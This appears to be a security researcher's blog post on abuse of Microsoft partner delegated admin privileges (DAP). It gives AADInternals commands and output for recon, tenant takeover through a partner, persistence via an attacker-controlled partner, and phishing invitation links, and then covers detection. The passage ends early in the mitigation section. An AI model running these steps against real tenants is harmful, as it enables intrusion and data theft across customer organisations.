<!DOCTYPE html>
<html lang="en-gb">
<head>
<meta charset="UTF-8">
<meta http-equiv="cache-control" content="no-cache"> 
<meta http-equiv="expires" content="0"> 
<meta http-equiv="pragma" content="no-cache">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Microsoft partners: The Good, The Bad, or The Ugly?</title>
<meta name="description" content="The site for Microsoft 365 and Azure AD administrators">
<meta name="generator" content="Hugo 0.39" />
<meta property="og:title" content="Microsoft partners: The Good, The Bad, or The Ugly?" />
<meta property="og:description" content="In 2018, I blogged first time about risks related to Delegated Administrative Privileges (DAP) given to Microsoft partners.
Now, in 2021, Microsoft blogged how NOBELIUM exploited DAP to compromise
customers of some Microsoft partners.

In this blog, I&rsquo;ll explain why DAP is so dangerous, how to exploit it, how to detect exploitation, and how to view partner related information with AADInternals v0.6.5.

" />
<meta property="og:type" content="article" />
<meta property="og:url" content="http://o365blog.com/post/partners/" />



<meta property="article:published_time" content="2021-12-11T00:00:00&#43;00:00"/>

<meta property="article:modified_time" content="2022-02-15T00:00:00&#43;00:00"/>











<link rel="dns-prefetch" href="//fonts.googleapis.com" />
<link rel="dns-prefetch" href="//fonts.gstatic.com" />

<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open+Sans:400,400italic,700" type="text/css" media="all" />
<link href="//maxcdn.bootstrapcdn.com/font-awesome/4.5.0/css/font-awesome.min.css" rel="stylesheet">
<link rel="stylesheet" href="/css/style.css" type="text/css" media="all" />
<script type="text/javascript" src="/js/scripts.js"></script>
<script type="text/javascript" src="/js/tools.js"></script>

<link rel="apple-touch-icon-precomposed" sizes="57x57" href="/images/apple-touch-icon-57x57.png" />
<link rel="apple-touch-icon-precomposed" sizes="114x114" href="/images/apple-touch-icon-114x114.png" />
<link rel="apple-touch-icon-precomposed" sizes="72x72" href="/images/apple-touch-icon-72x72.png" />
<link rel="apple-touch-icon-precomposed" sizes="144x144" href="/images/apple-touch-icon-144x144.png" />
<link rel="apple-touch-icon-precomposed" sizes="60x60" href="/images/apple-touch-icon-60x60.png" />
<link rel="apple-touch-icon-precomposed" sizes="120x120" href="/images/apple-touch-icon-120x120.png" />
<link rel="apple-touch-icon-precomposed" sizes="76x76" href="/images/apple-touch-icon-76x76.png" />
<link rel="apple-touch-icon-precomposed" sizes="152x152" href="/images/apple-touch-icon-152x152.png" />
<link rel="icon" type="image/png" href="/images/favicon-196x196.png" sizes="196x196" />
<link rel="icon" type="image/png" href="/images/favicon-96x96.png" sizes="96x96" />
<link rel="icon" type="image/png" href="/images/favicon-32x32.png" sizes="32x32" />
<link rel="icon" type="image/png" href="/images/favicon-16x16.png" sizes="16x16" />
<link rel="icon" type="image/png" href="/images/favicon-128.png" sizes="128x128" />
<meta name="application-name" content="&nbsp;"/>
<meta name="msapplication-TileColor" content="#FFFFFF" />
<meta name="msapplication-TileImage" content="/images/mstile-144x144.png" />
<meta name="msapplication-square70x70logo" content="/images/mstile-70x70.png" />
<meta name="msapplication-square150x150logo" content="/images/mstile-150x150.png" />
<meta name="msapplication-wide310x150logo" content="/images/mstile-310x150.png" />
<meta name="msapplication-square310x310logo" content="/images/mstile-310x310.png" />


<script>
window.ga=window.ga||function(){(ga.q=ga.q||[]).push(arguments)};ga.l=+new Date;
ga('create', 'UA-61454000-4', 'auto');
ga('send', 'pageview');
</script>
<script async src='//www.google-analytics.com/analytics.js'></script>

</head>
<body class="body body-right-sidebar mobile" itemscope="itemscope" itemtype="http://schema.org/WebPage">
	<div class="container container-outer">
		<header class="header" itemscope="itemscope" itemtype="http://schema.org/WPHeader">
		
			<div class="container container-inner clearfix">
			
				<div class="logo" role="banner" itemscope="itemscope" itemtype="http://schema.org/Brand">
				
					<a class="logo__link" href="/" title="Office 365 blog" rel="home">
						<img src="/images/favicon-96x96.png"><h1 class="logo__title">Office 365 blog</h1>
						<h2 class="logo__tagline">Everything about Microsoft 365 security</h2>
					</a>
				</div>
			</div>
			
<nav class="menu" itemscope="itemscope" itemtype="http://schema.org/SiteNavigationElement">
	<ul class="menu__list">
		<li class="menu__item "><a class="menu__link" href="/aadkillchain/">AAD &amp; M365 KILL CHAIN</a></li>
		<li class="menu__item "><a class="menu__link" href="/aadinternals/">AAD INTERNALS</a></li>
		<li class="menu__item "><a class="menu__link" href="/links/">LINKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/powershell/">POWERSHELL</a></li>
		<li class="menu__item "><a class="menu__link" href="/talks/">TALKS</a></li>
		<li class="menu__item "><a class="menu__link" href="/tools/">TOOLS</a></li>
	</ul>
</nav>

		</header>
		<div class="wrapper clearfix">

<main class="main-content content" role="main" itemprop="mainContentOfPage">
	<article class="post">
		<header class="post__header clearfix">
			<h1 class="post__title">Microsoft partners: The Good, The Bad, or The Ugly?</h1>
			<p class="post__meta meta">
				<svg class="icon icon-time" height="14" viewBox="0 0 16 16" width="14" xmlns="http://www.w3.org/2000/svg"><path d="m8-.0000003c-4.4 0-8 3.6-8 8 0 4.4000003 3.6 8.0000003 8 8.0000003 4.4 0 8-3.6 8-8.0000003 0-4.4-3.6-8-8-8zm0 14.4000003c-3.52 0-6.4-2.88-6.4-6.4000003 0-3.52 2.88-6.4 6.4-6.4 3.52 0 6.4 2.88 6.4 6.4 0 3.5200003-2.88 6.4000003-6.4 6.4000003zm.4-10.4000003h-1.2v4.8l4.16 2.5600003.64-1.04-3.6-2.1600003z"/></svg>
				<time class="post__meta-date" datetime="2021-12-11T00:00:00">December 11, 2021</time>
					<time class="post__meta-lastmod" datetime="2022-02-15T00:00:00"> (Last Modified: February 15, 2022)</time>
				<span class="post__meta-categories meta-categories">
					<svg class="icon icon-category" height="16" viewBox="0 0 16 16" width="16" xmlns="http://www.w3.org/2000/svg"><path d="m7 2l1 2h8v11h-16v-13z"/></svg>
					<a class="meta-categories__link" href="/categories/blog" rel="category">blog</a></span>
			</p>
			<div class="post__tags tags clearfix">
<ul class="tags__list">
	<li class="tags__item"><a class="tags__link" href="http://twitter.com/intent/tweet?url=http%3a%2f%2fo365blog.com%2fpost%2fpartners%2f&text=Microsoft%20partners%3a%20The%20Good%2c%20The%20Bad%2c%20or%20The%20Ugly%3f&tw_p=tweetbutton" title="Share in Twitter" target="_blank" rel="nofollow"><i class="fa fa-twitter" aria-hidden="true"></i></a></li>
	<li class="tags__item"><a class="tags__link" href="https://www.linkedin.com/shareArticle?url=http%3a%2f%2fo365blog.com%2fpost%2fpartners%2f&mini=true&title=Microsoft%20partners%3a%20The%20Good%2c%20The%20Bad%2c%20or%20The%20Ugly%3f&summary=&source=o365blog.com" title="Share in LinkedIn" target="_blank" rel="nofollow"><i class="fa fa-linkedin" aria-hidden="true"></i></a></li>
</ul>
</div>
		</header>
		<div class="post__content clearfix">
			<figure class="post__thumbnail">
				<img src="/images/posts/partners.png" alt="Microsoft partners: The Good, The Bad, or The Ugly?">
			</figure>
				<nav id="TableOfContents">
<ul>
<li><a href="#introduction">Introduction</a></li>
<li><a href="#accessing-partner-information">Accessing partner information</a>
<ul>
<li><a href="#partners">Partners</a>
<ul>
<li><a href="#partner-account-identifiers">Partner account identifiers</a></li>
<li><a href="#customer-list">Customer list</a></li>
</ul></li>
<li><a href="#customers">Customers</a></li>
</ul></li>
<li><a href="#exploiting">Exploiting</a>
<ul>
<li><a href="#finding-a-partner">Finding a partner</a></li>
<li><a href="#attacking-partner-s-customers">Attacking partner&rsquo;s customers</a></li>
<li><a href="#adding-a-new-partner-to-compromised-organisation">Adding a new partner to compromised organisation</a></li>
<li><a href="#compromising-new-customers">Compromising new customers</a></li>
</ul></li>
<li><a href="#detecting">Detecting</a>
<ul>
<li><a href="#partner-accessing-customer-organisation">Partner accessing customer organisation</a>
<ul>
<li><a href="#microsoft-partner-center-and-api-access">Microsoft Partner Center and API access</a></li>
<li><a href="#powershell-access">PowerShell access</a></li>
</ul></li>
<li><a href="#adding-new-partners">Adding new partners</a></li>
</ul></li>
<li><a href="#preventing-mitigating">Preventing/mitigating</a>
<ul>
<li><a href="#partner-accessing-customer-organisation-1">Partner accessing customer organisation</a></li>
<li><a href="#adding-new-partners-1">Adding new partners</a></li>
</ul></li>
<li><a href="#summary">Summary</a></li>
<li><a href="#references">References</a></li>
</ul>
</nav>
			<p>In 2018, I <a href="/post/o365-gdpr/#delegated-administration" target="_blank">blogged</a> first time about risks related to Delegated Administrative Privileges (DAP) given to Microsoft partners.
Now, in 2021, Microsoft <a href="https://www.microsoft.com/security/blog/2021/10/25/nobelium-targeting-delegated-administrative-privileges-to-facilitate-broader-attacks/" target="_blank">blogged</a> how NOBELIUM exploited DAP to compromise
customers of some Microsoft partners.</p>

<p>In this blog, I&rsquo;ll explain why DAP is so dangerous, how to exploit it, how to detect exploitation, and how to view partner related information with <strong>AADInternals v0.6.5</strong>.</p>

<p></p>

<h1 id="introduction">Introduction</h1>

<p>According to Microsoft <a href="https://docs.microsoft.com/en-us/microsoft-365/commerce/manage-partners" target="_blank">documentation</a>, partners has different types to choose from when working with their customers. In this blog, we are focusing on <strong>Delegated administrator partners</strong>.</p>

<table>
<thead>
<tr>
<th>Partner type</th>
<th>Description</th>
</tr>
</thead>

<tbody>
<tr>
<td>Reseller</td>
<td>Partners that sell Microsoft products to your organization or school.</td>
</tr>

<tr>
<td><strong>Delegated administrator</strong></td>
<td><strong>Partners that manage products and services for your organization or school. In Azure Active Directory (AD), the partner is a Global Administrator for your tenant. This role lets them manage services like creating user accounts, assigning and managing licenses, and password resets.</strong></td>
</tr>

<tr>
<td>Reseller &amp; delegated administrator</td>
<td>Partners that sell and manage Microsoft products and services to your organization or school.</td>
</tr>

<tr>
<td>Partner</td>
<td>You give your partner a user account in your tenant, and they work with other Microsoft services on your behalf.</td>
</tr>

<tr>
<td>Advisor</td>
<td>Partners can reset passwords and handle support incidents for you.</td>
</tr>

<tr>
<td>Microsoft Products &amp; Services Agreement (MPSA) partner</td>
<td>If you&rsquo;ve worked with multiple partners through the MPSA program, you can allow them to see purchases made by each other.</td>
</tr>

<tr>
<td>Line-of-business (LOB) partner</td>
<td>Partners can develop, submit, and manage LOB apps specific for your organization or school.</td>
</tr>
</tbody>
</table>

<p><strong>Delegated Administrative Privileges (DAP)</strong> is a way to &ldquo;outsource&rdquo; administrative tasks to a Microsoft partner you trust. DAP can be included in a &ldquo;contract&rdquo; between a partner and a customer, which the partner offers and the customer accepts:</p>

<p><img src="/images/posts/partners_02.png" alt="Partners" /></p>

<p>After the partner&rsquo;s contract offer (including DAP) is accepted by the customer, the partner has rights to administer customer&rsquo;s tenant. By default, partner will have <a href="https://docs.microsoft.com/en-us/partner-center/customers-revoke-admin-privileges#delegated-admin-privileges-in-azure-ad" target="_blank">two roles</a>: <strong>Global administrator</strong> and <strong>Helpdesk admistrator</strong>.
These roles can be assigned to users of the Partner organisation in Partner&rsquo;s tenant. In Partner center, these roles are called <strong>Admin agent</strong> and <strong>Heldesk agent</strong>:</p>

<p><img src="/images/posts/partners_03.png" alt="Partners" /></p>

<p>The problem here is that you can&rsquo;t limit partner users&rsquo; access to a certain tenant.
That means that after assigning for example the <strong>Admin agent</strong> role to user of Partner tenant, that user has <strong>Global administrator access to all customers of the parter</strong>!</p>

<p><strong>Note:</strong> Microsoft announced in November 2021 <a href="https://docs.microsoft.com/en-us/partner-center/announcements/2021-november#5" target="_blank">granular delegated admin priviliges (GDAP)</a> coming out in early 2022, which should address these issues.</p>

<p><img src="/images/posts/partners_01.png" alt="Partners" /></p>

<p>From the customer point-of-view, this is a huge problem as customers don&rsquo;t have access to partner organisations. In practice, the customer doesn&rsquo;t know how many Global administrators they have.
For instance, in a figure above, the Customer C can have any number of Global administrators from Partner A and B tenants. This alone is violating many data-protection laws, including <a href="/images/posts/Syynimaa & Viitanen (2018). Is my Office 365 GDPR Compliant Security Issues in Authentication and Administration.pdf" target="_blank">GDPR</a>.</p>

<p>So, what&rsquo;s the big deal with the DAP then? Well, instead of trying to breach multiple organisations, threat actors can focus on breaching one partner organisation. After that, threat actors has open doors to all customer tenants of the partner.</p>

<h1 id="accessing-partner-information">Accessing partner information</h1>

<p>Let&rsquo;s next see how the partner information and relationships can be viewed in Partner and Customer tenants.</p>

<h2 id="partners">Partners</h2>

<p>Partners can access all partner information at the Microsoft Partner Center at <a href="https://partner.microsoft.com/dashboard/home">https://partner.microsoft.com/dashboard/home</a></p>

<h3 id="partner-account-identifiers">Partner account identifiers</h3>

<p>Partners can manage and view their partner IDs and locations at <a href="https://partner.microsoft.com/en-us/dashboard/account/v3/organization/identity">https://partner.microsoft.com/en-us/dashboard/account/v3/organization/identity</a></p>

<p><img src="/images/posts/partners_05.png" alt="Partners" /></p>

<p>For the reasons unknown, this information (and all seen above) is available also for normal users, withouth admin permissions or rights to Microsoft Partner Center.</p>

<p><strong>Note!</strong> This behaviour has been reported to Microsoft (and later publicly shared) earlier in 2021 by another individual.</p>

<p>Threat actors can&rsquo;t use this information directly for attacks, but contains a lot of interesting intel for social engineering and phishing purposes..</p>

<p>To get the list of Partner locations with AADInternals:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForMSPartner</span> <span class="n">-SaveToCache</span>

<span class="c"># List the partner organisations</span>
<span class="nb">Get-AADIntMSPartnerOrganizations</span></code></pre></div></p>

<pre><code>id             : 9a0c7346-f305-4646-b3fb-772853f6b209
typeName       : Tenant
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 60a0020f-bd16-4f27-a23c-104644918834
typeName       : PartnerGlobal
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559542
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}

id             : 297588a4-5c2a-430e-ae1e-b16c5d944a7d
typeName       : PartnerLocation
name           : Partner Ltd, US, PARTNERVILLE
legalEntityCid : bc07db21-7a22-4fc9-9f8a-5df27532f09f
MPNID          : 8559543
companyName    : Partner Ltd
address        : @{country=US; city=PARTNERVILLE; state=AT; addressLine1=666 Partner Park; addressLine2=; postalCode=1234567890}
contact        : @{firstName=Partner; lastName=Manager; email=pmanager@company.com; phoneNumber=+1 234567890}
</code></pre>

<h3 id="customer-list">Customer list</h3>

<p>The most important information for threat actors would be to know the customers of the tenant. To view customers, the type of relationship, and links to administer their services, just browse to <a href="https://partner.microsoft.com/en-us/dashboard/commerce2/customers/list">https://partner.microsoft.com/en-us/dashboard/commerce2/customers/list</a></p>

<p><img src="/images/posts/partners_04.png" alt="Partners" /></p>

<p>To access Microsoft Partner Center, the user must have been given permissions to use it.</p>

<p>However, luckily, the good old <strong>MSOnline</strong> PowerShell module have provided the same information since the beginning of times - without any admin rights or permissions to Microsoft Partner Center! This is now included also in AADInternals.</p>

<p>To view partner&rsquo;s customers with AADInternals:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span> 

<span class="c"># List the partner&#39;s customer organisations</span>
<span class="nb">Get-AADIntMSPartnerContracts</span></code></pre></div></p>

<pre><code>CustomerName     CustomerTenantId                     CustomerDefaultDomain   ContractType           
------------     ----------------                     ---------------------   ------------           
Company          dad33f16-69d1-4e32-880e-9c2d21aa3e59 company.com             SupportPartnerContract 
Contoso          936b7883-4746-4b89-8bc4-c8128795cd7f contoso.onmicrosoft.com ResellerPartnerContract
Adatum           17427dcd-8d61-4c23-9c68-d1f34975b420 adatum.com              SupportPartnerContract 
</code></pre>

<p>And voil√†, there&rsquo;s the list of organisations this partner can administer!</p>

<h2 id="customers">Customers</h2>

<p>Customer&rsquo;s admins can view the list of partners and remove their admin rights at <a href="https://admin.microsoft.com/Adminportal/Home?source=applauncher#/partners">https://admin.microsoft.com/Adminportal/Home?source=applauncher#/partners</a></p>

<p><img src="/images/posts/partners_06.png" alt="Partners" /></p>

<p>Unfortunately, this information is not available for normal users.</p>

<p>To view partners with AADInternals:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># List the partners</span>
<span class="nb">Get-AADIntMSPartners</span></code></pre></div></p>

<pre><code>Identity         : b1f6d5cc-f1d3-41d9-b88c-1d177aaf171b
DisplayName      : Partner Ltd
Email            : pmanager@company.com
Website          : http://www.company.com
Phone            : +1234567890
Relationship     : Indirect Reseller and Admin
TypeDetail       : PartnerAdmin
CanDelete        : False
CanRemoveDap     : True
AllDataRetrieved : True
</code></pre>

<h1 id="exploiting">Exploiting</h1>

<p>Let&rsquo;s jump to the shoes of threat actor: How can we exploit all what we have learned?</p>

<h2 id="finding-a-partner">Finding a partner</h2>

<p>First step for a threat actor is to find suitable partners to target. Microsoft has made this easy, as you can search
for partners at <a href="https://appsource.microsoft.com/en-us/marketplace/partner-dir" target="_blank">AppSource</a> portal.</p>

<p>AADInternals makes this even more easy:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Find the first 20 MSP partners from Finland</span>
<span class="n">Find-AADIntMSPartners</span> <span class="n">-Country</span> <span class="n">FI</span> <span class="n">-MaxResults</span> <span class="n">20</span> <span class="n">-Services</span> <span class="s1">&#39;Managed Services (MSP)&#39;</span> <span class="p">|</span> <span class="n">Sort</span> <span class="n">CompanyName</span></code></pre></div>

<p><strong>Output:</strong></p>

<pre><code>Estimated total matches: 511

TenantId                             CompanyName                  Country Address                                    
--------                             -----------                  ------- -------                                    
b3665057-2eaa-4fa7-9f45-c4a17f405fb6 Atea Finland Oy              FI      @{country=FI; region=Europe; city=Vantaa...
cf36141c-ddd7-45a7-b073-111f66d0b30c Avanade Inc.                 FI      @{country=FI; region=Europe; city=Porkka...
12f4ed76-f694-4b1e-9b57-c3849eea3f6c CANORAMA OY AB               FI      @{country=FI; region=Europe; city=Sein√§j...
72b4c351-3bb3-45f1-91e4-9b2b1364f0d8 Capgemini Finland Oy         FI      @{country=FI; region=Europe; city=ESPOO;...
bff3224c-767a-4628-8c53-23a4df13a03c CloudNow IT Oy               FI      @{country=FI; region=Europe; city=Vantaa...
e157e107-0a76-4b3d-ba88-fe07cc786112 Crayon Oy                    FI      @{country=FI; region=Europe; city=Helsin...
93f33571-550f-43cf-b09f-cd331338d086 DXC Technology Services LLC. FI      @{country=FI; region=Europe; city=Espoo;...
d11dbe02-4edd-4edf-882f-dc2431a03ada ELISA OYJ                    FI      @{country=FI; region=Europe; city=HELSIN...
028f2339-46fc-4134-a44a-e1412faa38eb Enfo Oyj                     FI      @{country=FI; region=Europe; city=Kuopio...
d944c18e-fb3f-4f60-bd8b-ce7a27ff9df9 Fujitsu Finland Oy           FI      @{country=FI; region=Europe; city=Helsin...
189de737-c93a-4f5a-8b68-6f4ca9941912 HCL TECHNOLOGIES LIMITED     FI      @{country=FI; region=Europe; city=Espoo;...
1d3bdd24-8ca7-4b5a-9984-6d3cd45ee2c4 Henson Group                 FI      @{country=FI; region=Europe; city=Tamper...
7c0c36f5-af83-4c24-8844-9962e0163719 Hexaware Technologies        FI      @{country=FI; region=Europe; city=Helsin...
99ebba89-0dd9-4b7b-8f23-95339d2a81e1 IBM                          FI      @{country=FI; region=Europe; city=Helsin...
f8407946-d2c1-4fcc-ae95-63723ace3665 IBM Nordcloud EMEA           FI      @{country=FI; region=Europe; city=Jyv√§sk...
0a4d4529-3bd8-41d2-bdbe-aa4634a1752b Infopulse Ukraine LLC        FI      @{country=FI; region=Europe; city=Helsin...
4b1f17f7-26f6-4624-a58c-2bc917bae8f3 Intercept                    FI      @{country=FI; region=Europe; city=Espoo;...
d975d022-a4d5-40ca-ba77-d6a8c8dbfe9b Midpointed Ltd               FI      @{country=FI; region=Europe; city=Helsin...
7bb1a8e5-59ee-489d-86f5-a50210ae3970 Solita Oy                    FI      @{country=FI; region=Europe; city=HELSIN...
779fd0ca-9067-49da-8991-9cde176b7f1d Tietokeskus Finland Oy       FI      @{country=FI; region=Europe; city=TAMPER...
</code></pre>

<h2 id="attacking-partner-s-customers">Attacking partner&rsquo;s customers</h2>

<p>Next step is to get a foothold to a partner tenant. There are multiple techniques for this, such as <a href="/post/phishing" target="_blank">phishing</a>, brute-forcing, or on-prem attacks (<a href="/post/adfs" target="_blank">Golden SAML</a>).</p>

<p>At this point, any user account will do, as after getting the access, we can run AADInternals&rsquo; recon tool:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get accesstoken</span>
<span class="nb">Get-AADIntAccessTokenForAzureCoreManagement</span> <span class="n">-SaveToCache</span>

<span class="c"># Invoke the reconnaissance and save results to a variable</span>
<span class="nv">$results</span> <span class="p">=</span> <span class="nb">Invoke-AADIntReconAsInsider</span></code></pre></div>
Output:</p>

<pre><code>Tenant brand:                Company Ltd
Tenant name:                 company.onmicrosoft.com
Tenant id:                   6e3846ee-e8ca-4609-a3ab-f405cfbd02cd
Azure AD objects:            520/500000
Domains:                     6 (4 verified)
Non-admin users restricted?  True
Users can register apps?     True
Directory access restricted? False
Directory sync enabled?      true
CA policies:                 8
MS Partner IDs:              8559542,8559543
MS Partner DAP enabled?      True
MS Partner contracts:        3
MS Partners:                 1
</code></pre>

<p>This reveals that we have indeed accessed a partner organisation, having 3 customers. We can now list the customers:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List the customers</span>
<span class="nv">$recon</span><span class="p">.</span><span class="n">partnerContracts</span></code></pre></div></p>

<pre><code>CustomerName     CustomerTenantId                     CustomerDefaultDomain   ContractType           
------------     ----------------                     ---------------------   ------------           
Company          dad33f16-69d1-4e32-880e-9c2d21aa3e59 company.com             SupportPartnerContract 
Contoso          936b7883-4746-4b89-8bc4-c8128795cd7f contoso.onmicrosoft.com ResellerPartnerContract
Adatum           17427dcd-8d61-4c23-9c68-d1f34975b420 adatum.com              SupportPartnerContract 
</code></pre>

<p>Next step is to list users who has <strong>Admin Agent</strong> or <strong>Helpdesk Agent</strong> roles:</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># List users with Admin Agent role</span>
<span class="nv">$recon</span><span class="p">.</span><span class="n">partnerRoleInformation</span> <span class="p">|</span> <span class="n">where</span> <span class="n">Name</span> <span class="o">-eq</span> <span class="s2">&#34;Admin Agent&#34;</span> <span class="p">|</span> <span class="n">select</span> <span class="n">-ExpandProperty</span> <span class="n">Members</span></code></pre></div>

<pre><code>displayName      userPrincipalName                    
-----------      -----------------                    
Admin User      admin@company.onmicrosoft.com
Diego Siciliani DiegoS@contoso.com
Alex Wilber     AlexW@contoso.com
</code></pre>

<p>And now we have found the target users!</p>

<p>The next step is to sign-in to the Microsoft Partner Center as the target user, or use <strong>MSOnline</strong> PowerShell module:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Connect to partner tenant</span>
<span class="nb">Connect-MsolService</span>

<span class="c"># Use any MSOnline cmdlet with -TenantId parameter!</span>
<span class="nb">Get-MsolCompanyInformation</span> <span class="n">-TenantId</span> <span class="n">dad33f16</span><span class="p">-</span><span class="n">69d1</span><span class="p">-</span><span class="n">4e32</span><span class="p">-</span><span class="n">880e</span><span class="p">-</span><span class="n">9c2d21aa3e59</span></code></pre></div></p>

<p>You can also use most of the <strong>AADInternals</strong> functions:
<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token for the customer&#39;s tenant</span>
<span class="nb">Get-AADIntAccessTokenForAADGraph</span> <span class="n">-SaveToCache</span> <span class="n">-Tenant</span> <span class="n">dad33f16</span><span class="p">-</span><span class="n">69d1</span><span class="p">-</span><span class="n">4e32</span><span class="p">-</span><span class="n">880e</span><span class="p">-</span><span class="n">9c2d21aa3e59</span>

<span class="c"># Show company information</span>
<span class="nb">Get-AADIntCompanyInformation</span></code></pre></div></p>

<pre><code>AllowAdHocSubscriptions                  : true
AllowEmailVerifiedUsers                  : true
AuthorizedServiceInstances               : AuthorizedServiceInstances
AuthorizedServices                       : 
City                                     : 
CompanyDeletionStartTime                 : 
CompanyTags                              : CompanyTags
CompanyType                              : CompanyTenant
CompassEnabled                           : 
Country                                  : 
CountryLetterCode                        : US
DapEnabled                               : 
DefaultUsageLocation                     : 
DirSyncAnchorAttribute                   : mS-DS-ConsistencyGuid
DirSyncApplicationType                   : 1651564e-7ce4-4d99-88be-0a65050d8dc3
DirSyncClientMachineName                 : SERVER
DirSyncClientVersion                     : 1.4.38.0
DirSyncServiceAccount                    : Sync_SERVER1_xxxxxxxxxxx@company.onmicrosoft.com
DirectorySynchronizationEnabled          : true
DirectorySynchronizationStatus           : Enabled
DisplayName                              : Company Ltd
InitialDomain                            : company.onmicrosoft.com
LastDirSyncTime                          : 2020-08-03T15:29:34Z
LastPasswordSyncTime                     : 2020-08-03T15:09:07Z
MarketingNotificationEmails              : 
MultipleDataLocationsForServicesEnabled  : 
ObjectId                                 : 527e940d-2526-483b-82a9-d5b6bf6cc165
PasswordSynchronizationEnabled           : true
PortalSettings                           : PortalSettings
PostalCode                               : 
PreferredLanguage                        : en
ReleaseTrack                             : FirstRelease
ReplicationScope                         : NA
RmsViralSignUpEnabled                    : true
SecurityComplianceNotificationEmails     : 
SecurityComplianceNotificationPhones     : 
SelfServePasswordResetEnabled            : true
ServiceInformation                       : ServiceInformation
ServiceInstanceInformation               : ServiceInstanceInformation
State                                    : 
Street                                   : 
SubscriptionProvisioningLimited          : false
TechnicalNotificationEmails              : TechnicalNotificationEmails
TelephoneNumber                          : 1324567890
UIExtensibilityUris                      : 
UsersPermissionToCreateGroupsEnabled     : true
UsersPermissionToCreateLOBAppsEnabled    : true
UsersPermissionToReadOtherUsersEnabled   : true
UsersPermissionToUserConsentToAppEnabled : true
WhenCreated                              : 2019-07-14T07:03:20Z
</code></pre>

<h2 id="adding-a-new-partner-to-compromised-organisation">Adding a new partner to compromised organisation</h2>

<p>One way to achieve persistent access to already compromised organisation is to add a partner tenant that is controlled by the threat actor.</p>

<p>With Global admin level access to compromised organisation, AADInternals can be used to easily add new partners. You just need to know any domain name or tenant id of the partner.</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Get access token and save to cache</span>
<span class="nb">Get-AADIntAccessTokenForAdmin</span> <span class="n">-SaveToCache</span>

<span class="c"># Assign DAP for the given partner</span>
<span class="n">Approve-AADIntMSPartnerDelegatedAdminRequest</span> <span class="n">-Domain</span> <span class="s2">&#34;partner.com&#34;</span></code></pre></div>

<pre><code>responseCode message
------------ -------
success 
</code></pre>

<h2 id="compromising-new-customers">Compromising new customers</h2>

<p>The example above requires Global administrator access to customer&rsquo;s tenant. But what if we don&rsquo;t have the needed access?
The answer is to create a link for approving the partner offer and then lure target organisation administrator to accept that.</p>

<p>Again, all you need to know is any domain name or tenant id of the partner.</p>

<div class="highlight"><pre class="chroma"><code class="language-powershell" data-lang="powershell"><span class="c"># Create the delegated admin request for the given partner tenant</span>
<span class="nb">New-AADIntMSPartnerDelegatedAdminRequest</span> <span class="n">-TenantId</span> <span class="n">c7e52a77-e461</span><span class="p">-</span><span class="n">4f2e-a652</span><span class="p">-</span><span class="n">573305414be9</span></code></pre></div>

<pre><code>https://admin.microsoft.com/Adminportal/Home?invType=Administration&amp;partnerId=c7e52a77-e461-4f2e-a652-573305414be9#/BillingAccounts/partner-invitation
</code></pre>

<p>Now the link can be sent to any target organisations üòä</p>

<h1 id="detecting">Detecting</h1>

<h2 id="partner-accessing-customer-organisation">Partner accessing customer organisation</h2>

<h3 id="microsoft-partner-center-and-api-access">Microsoft Partner Center and API access</h3>

<p>If the partner is accessing customers services from the Microsoft Partner Center, the login event will be shown in customer&rsquo;s <strong>sign-ins (interactive)</strong> log:</p>

<p><img src="/images/posts/partners_08.png" alt="Partners" /></p>

<p>As we can see, the user name is actually &ldquo;<Partner tenant name> technician&rdquo;, and the last part of IP address is redacted. When the event is expanded, we can also see the actual user name:</p>

<p><img src="/images/posts/partners_09.png" alt="Partners" /></p>

<p>In partner&rsquo;s tenant, we can see the same event with the same <strong>Request ID</strong>:</p>

<p><img src="/images/posts/partners_10.png" alt="Partners" /></p>

<p>Some events are also seen in customer&rsquo;s <strong>sign-ins (non-interactive)</strong> log:</p>

<p><img src="/images/posts/partners_11.png" alt="Partners" /></p>

<h3 id="powershell-access">PowerShell access</h3>

<p>If the parter (or threat actor) is using <strong>MSOnline</strong> PowerShell module, sign-in events are not logged anywhere!
This means that threat actor can, for instance, dump the whole content of customer&rsquo;s Azure Active Directory without a fear of getting caught ü§¶‚Äç</p>

<p>However, all modifications are logged normally to customer&rsquo;s <strong>Audit logs</strong>:</p>

<p><img src="/images/posts/partners_13.png" alt="Partners" /></p>

<h2 id="adding-new-partners">Adding new partners</h2>

<p>Whenever a new partner is added to the organisation, there will be an event in the <strong>Audit Logs</strong>:</p>

<p><img src="/images/posts/partners_07.png" alt="Partners" /></p>

<h1 id="preventing-mitigating">Preventing/mitigating</h1>

<h2 id="partner-accessing-customer-organisation-1">Partner accessing customer organisation</h2>

<p>Microsoft announced in November 2021 a new more granular DAP called GDAP, which will allow partners to have more granular and time-bound access to their customers.
